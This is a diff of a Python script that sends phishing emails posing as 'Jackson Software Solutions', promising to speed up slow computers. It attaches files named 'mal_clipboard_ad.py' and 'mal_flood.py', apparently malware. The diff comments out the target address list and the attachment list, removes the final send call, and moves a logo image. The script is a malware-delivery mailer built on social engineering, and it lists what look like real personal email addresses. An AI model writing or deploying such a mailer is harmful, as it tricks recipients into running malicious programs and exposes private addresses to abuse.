@@ -4,8 +4,8 @@ from email.mime.base import MIMEBase
 from email import encoders 
 import smtplib
 
-emails = ['gncis8@gmail.com','gncis@yahoo.com','samreenansari1998@gmail.com']
-files = ['mal_clipboard_ad.py','mal_flood.py']
+#emails = ['gncis8@gmail.com','gncis@yahoo.com','samreenansari1998@gmail.com']
+#files = ['mal_clipboard_ad.py','mal_flood.py']
 
 def send_email(emails,files):
 	server = smtplib.SMTP('smtp.gmail.com', 587) #to connect with the smtp gmail server
@@ -22,8 +22,9 @@ def send_email(emails,files):
 	html_txt = """
 	<html>
 		<body>
-			<img src="https://www.avineon.com/sites/default/files/Software-Solutions_1285x588.jpg" alt="Company logo">
+			
 			<h2> Jackson Software Solutions can Help you </h2>
+			<img src="https://www.avineon.com/sites/default/files/Software-Solutions_1285x588.jpg" alt="Company logo">
 			<h3> Has your compueter been getting slow and troublesome?</h3>
 			<h4> We have the solution to everythin with a few programs that can 
 			optimize the RAM to work properly with the processor and make the system super fast</h4>
@@ -69,5 +70,3 @@ def send_email(emails,files):
 	  
 	# terminating the session 
 	server.quit() 
-
-send_email(emails,files)
